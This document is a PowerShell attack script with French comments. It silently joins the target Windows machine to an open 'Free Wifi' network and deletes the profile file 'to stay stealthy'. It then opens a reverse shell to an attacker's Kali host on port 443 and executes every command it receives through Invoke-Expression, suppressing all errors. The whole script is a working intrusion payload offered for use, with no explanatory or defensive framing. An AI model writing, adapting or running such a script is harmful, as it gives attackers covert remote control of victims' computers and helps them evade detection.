# CONFIGURATION
$SSID = "Free Wifi"
$KALI_IP = "192.168.150.10"
$KALI_PORT = 443

# Génère le profil WiFi
$SSIDHEX = ($SSID.ToCharArray() | ForEach-Object { '{0:X}' -f ([int]$_) }) -join ''
$xml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$SSID</name>
    <SSIDConfig>
        <SSID>
            <hex>$SSIDHEX</hex>
            <name>$SSID</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>open</authentication>
                <encryption>none</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
        </security>
    </MSM>
</WLANProfile>
"@

# Écriture temporaire du profil
$profilePath = "$env:TEMP\wifi_$($SSID).xml"
$xml | Out-File -FilePath $profilePath -Encoding ASCII -Force

# Ajoute le profil et connecte
netsh wlan add profile filename="$profilePath" > $null
netsh wlan connect name="$SSID" > $null 2>&1

# Supprime le fichier pour rester furtif
Remove-Item $profilePath -Force -ErrorAction SilentlyContinue

# Attente pour laisser le temps pour le revshell
Start-Sleep -Seconds 8

# Reverse shell
try {
    $client = New-Object System.Net.Sockets.TCPClient($KALI_IP, $KALI_PORT);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535 | %{0};

    Set-Location $env:USERPROFILE  # <- Positionne la session dans le home

    $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(500, 1000)

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String );
        $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    }
    $client.Close()
} catch {}

